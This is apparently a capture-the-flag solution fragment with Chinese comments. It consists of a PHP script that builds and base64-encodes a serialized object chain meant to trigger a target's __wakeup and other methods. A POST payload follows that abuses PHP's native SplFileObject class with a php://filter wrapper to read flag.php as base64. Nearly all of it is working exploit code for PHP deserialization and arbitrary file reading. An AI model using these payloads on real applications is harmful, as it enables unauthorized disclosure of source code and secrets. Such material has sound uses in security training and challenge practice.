
```php
<?php
class teacher{
    public $name;
    public $rank;
    private $salary;
}

class classroom{
    public $name;
    public $leader;
}

class school{
    public $department;
    public $headmaster;
}
$a=new school(); #反序列化时先触发_wakeup（）
$a->headmaster='ong'; #调用IPO()，需要保证if条件满足
$a->department=new classroom(); #满足_wakeup（）中if条件，在这里创建classroom中的hahaha()
#下面的都是为了满足hahaha()中的if条件，分别给变量赋值
#也可以直接在类方法中提前给变量赋值
$a->department->name='one class';
$a->department->leader=new teacher();
$a->department->leader->name='ing';
$a->department->leader->rank='department';
echo base64_encode(serialize($a));  #打印结果
```

POST利用原生类
```
a=SplFileObject&b=php://filter/read=convert.base64-encode/resource=flag.php
```

